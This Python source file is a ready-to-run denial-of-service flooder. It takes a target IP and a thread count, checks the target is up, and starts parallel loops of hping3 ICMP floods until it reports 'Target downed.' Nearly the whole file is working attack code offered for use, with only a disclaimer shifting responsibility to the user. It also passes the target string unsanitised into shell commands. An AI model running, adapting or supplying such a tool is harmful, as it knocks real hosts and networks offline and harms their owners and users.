# Who use this script have the 100% of responsabilities and aftermath about his/her actions.

# (@u@) scripted by Skripto (@YourAnonSkripto) (@u@)

#      " Keyboard is more powerful than a nuke. "

import subprocess, threading, optparse, colorama, os

PARSER = optparse.OptionParser()
PARSER.add_option('-t','--target',action='store',dest='TRGT',help='Enter Target\'s IP,')
PARSER.add_option('-p','--power',action='store',dest='PWR',help='Enter DoS power (Default 5),')
OPTS = PARSER.parse_args()[0]

def Param_check():
    global POWER
    if not OPTS.TRGT:
        print('\n '+colorama.Back.LIGHTRED_EX+'Please use "--target" to specify the target\'s IP.'+colorama.Back.RESET+'\n')
        exit()
    else:
        DOT = 0
        for NUM in OPTS.TRGT:
            if NUM == '.':
                DOT += 1
            else:
                try:
                    int(NUM)
                except:
                    print('\n '+colorama.Back.LIGHTRED_EX+'Please enter a valid IP (ex. 127.0.0.1).'+colorama.Back.RESET+'\n')
                    exit()
        if DOT != 3:
            print('\n '+colorama.Back.LIGHTRED_EX+'Please enter a valid IP (ex. 127.0.0.1).'+colorama.Back.RESET+'\n')
            exit()
    
    if OPTS.PWR:
        try:
            POW = int(OPTS.PWR)
            POWER = POW
        except:
            print('\n '+colorama.Back.LIGHTRED_EX+'Please enter a valid power (5,6,7...).'+colorama.Back.RESET+'\n')
            exit()
        if POW > 10:
            try:
                input('\n '+colorama.Fore.LIGHTRED_EX+'Attention: '+colorama.Fore.LIGHTCYAN_EX+OPTS.PWR+colorama.Fore.LIGHTWHITE_EX
                +' is an high power DoS attack.\n            If you have a weak PC, this can maybe make it crash.'+colorama.Fore.LIGHTCYAN_EX
                +'\n\nPress ENTER to continue or CNTRL+C to exit.'+colorama.Fore.RESET)
            except KeyboardInterrupt:
                print()
                exit()

def Check_Target():
    if '100% packet loss' in subprocess.getoutput('ping -c 1 '+OPTS.TRGT):
        print(colorama.Fore.LIGHTBLACK_EX+'\n ['+colorama.Fore.LIGHTWHITE_EX+'?'+colorama.Fore.LIGHTBLACK_EX+'] '+colorama.Fore.LIGHTRED_EX+'Target unavailable'+colorama.Fore.LIGHTWHITE_EX+' !\n')
        exit()
        

def Ping0fDeath():
    global STOP
    command = 'hping3 '+OPTS.TRGT+' --icmp -C 8 -i u100'
    while not STOP:
        try:
            subprocess.call(command, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL, shell=True)
        except KeyboardInterrupt:
            STOP = True
            break
        except:
            continue

POWER = 5
STOP = False

Param_check()
print(colorama.Fore.LIGHTBLACK_EX+'\n ['+colorama.Fore.LIGHTWHITE_EX+'+'+colorama.Fore.LIGHTBLACK_EX+'] '+colorama.Fore.LIGHTCYAN_EX+'Checking target'+colorama.Fore.LIGHTWHITE_EX+' ...')
Check_Target()
print(colorama.Fore.LIGHTBLACK_EX+'\n ['+colorama.Fore.LIGHTWHITE_EX+'?'+colorama.Fore.LIGHTBLACK_EX+'] '+colorama.Fore.LIGHTGREEN_EX+'Target available'+colorama.Fore.LIGHTWHITE_EX+' !')
print(colorama.Fore.LIGHTBLACK_EX+'\n ['+colorama.Fore.LIGHTWHITE_EX+'+'+colorama.Fore.LIGHTBLACK_EX+'] '+colorama.Fore.LIGHTCYAN_EX+'Starting threads'+colorama.Fore.LIGHTWHITE_EX+' ...')
for POW in range(POWER):
    TH = threading.Thread(target=Ping0fDeath)
    TH.start()

print(colorama.Fore.LIGHTBLACK_EX+'\n ['+colorama.Fore.LIGHTWHITE_EX+'+'+colorama.Fore.LIGHTBLACK_EX+'] '+colorama.Fore.LIGHTCYAN_EX+'The attack is running'+colorama.Fore.LIGHTWHITE_EX+' ...\n')
while True:
    try:
        if '100% packet loss' in subprocess.getoutput('ping -c 10 '+OPTS.TRGT):
            print(colorama.Fore.LIGHTRED_EX+'\r Target downed.'+colorama.Fore.RESET, end='')
            
    except KeyboardInterrupt:
        STOP = True
        break

os.system('clear')
exit()